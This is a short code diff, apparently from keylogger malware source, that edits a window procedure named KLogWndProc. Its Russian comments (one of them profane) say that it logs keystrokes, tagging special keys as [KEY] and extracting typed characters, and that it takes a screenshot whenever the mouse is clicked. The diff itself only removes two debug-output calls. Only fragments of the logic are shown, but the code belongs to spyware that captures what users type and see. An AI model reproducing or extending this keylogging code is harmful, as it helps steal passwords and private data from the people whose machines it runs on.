@@ -98,8 +98,7 @@ LRESULT WINAPI KLogWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             {
                 // если это не символ а какая-то клавиша (ctrl, alt.. да любая другая VK_* хуйня) - выводим в отдадочный вывод [KEY]
                 //pwsprintfW(buff,L"[%s]", szBuff);
-                pOutputDebugStringW(buff);
-            }
+			}
             else
             {
                 // получаем символ
@@ -111,8 +110,7 @@ LRESULT WINAPI KLogWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
                 // и выводим в отладочный вывод СИМВОЛ
 				//pwsprintfW(buff,L"%s", Char);
-                pOutputDebugStringW(buff);
-            }
+			}
             break;
         }
         // если мыщей тыкнули - снимаем скрин
